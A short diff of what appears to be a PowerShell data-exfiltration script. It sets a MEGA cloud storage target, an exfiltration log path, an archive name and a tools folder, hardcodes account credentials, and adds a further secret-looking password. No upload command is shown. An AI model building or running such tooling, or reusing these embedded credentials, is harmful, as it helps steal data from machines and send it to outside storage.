@@ -12,6 +12,7 @@ $Column = ":";
 $LogFile = "$env:PUBLIC\exf\mega_exfiltration.txt";
 $Username = "dagive1680@emailkeep.com";
 $Password = "qQCxCqrEeXDyPN8zWh3p";
+$OPassword = "o3b6jk8uCTfpSNhuNiqD_2Af9te2jVabxoYWKz1Vyf5h7NB8"
 $Cloud_Storage = "mega"; 
 $ArchiveName = "data.zip";
 $ToolsDir = "$env:PUBLIC\toolz\"
